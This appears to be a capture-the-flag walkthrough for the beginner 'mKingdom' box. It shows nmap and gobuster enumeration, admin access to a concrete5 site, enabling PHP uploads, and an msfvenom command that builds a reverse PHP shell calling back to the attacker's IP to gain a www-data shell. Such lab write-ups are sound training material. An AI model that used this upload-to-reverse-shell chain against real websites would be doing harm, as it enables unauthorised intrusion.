---
description: Beginner-friendly box inspired by a certain mustache man.
---

# 🍄 mKingdom

```
nmap -A <IP>
```

<figure><img src="../../../.gitbook/assets/nmap.png" alt=""><figcaption></figcaption></figure>



```
gobuster dir -u http://<IP>:85/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<figure><img src="../../../.gitbook/assets/gobuster.png" alt=""><figcaption></figcaption></figure>

```
http://<IP>:85/app
```

<figure><img src="../../../.gitbook/assets/jump.png" alt=""><figcaption></figcaption></figure>

```
http://<IP>:85/app/castle/
```

<figure><img src="../../../.gitbook/assets/caslte.png" alt="" width="563"><figcaption></figcaption></figure>

This is a concrete5 website. We can get the version with [Wappalyzer](https://www.wappalyzer.com/) :&#x20;

<figure><img src="../../../.gitbook/assets/wappalyser.png" alt="" width="326"><figcaption></figcaption></figure>

We can see that we get a login page : /app/castle/index.php/login

<figure><img src="../../../.gitbook/assets/login.png" alt="" width="563"><figcaption></figcaption></figure>

With a lot of tries we can get the access to the admin panel :&#x20;

<figure><img src="../../../.gitbook/assets/getadmin.png" alt="" width="563"><figcaption></figcaption></figure>

With some research we get this RCE with the version : [https://vulners.com/hackerone/H1:768322](https://vulners.com/hackerone/H1:768322)

We can test the RCE like this :&#x20;

Add php file to allowed file types :

<figure><img src="../../../.gitbook/assets/allowedfiletypes.png" alt="" width="375"><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/addphp.png" alt=""><figcaption></figcaption></figure>

Create a reverse php file :&#x20;

```
msfvenom -p php/reverse_php LHOST=<YOUR_IP> LPORT=1234 > shell.php
```

<figure><img src="../../../.gitbook/assets/msfvenom.png" alt=""><figcaption></figcaption></figure>

And you can test the RCE on the FileManager :&#x20;

<figure><img src="../../../.gitbook/assets/filemanager.png" alt="" width="375"><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/upload (2).png" alt="" width="374"><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/reverseshell.png" alt=""><figcaption></figcaption></figure>

If you want a cool extension to get quickly some reverse shell or others payloads this is a great tool : [https://addons.mozilla.org/fr/firefox/addon/hacktools/](https://addons.mozilla.org/fr/firefox/addon/hacktools/)

We are www-data. So we search for user.txt and root.txt files.&#x20;
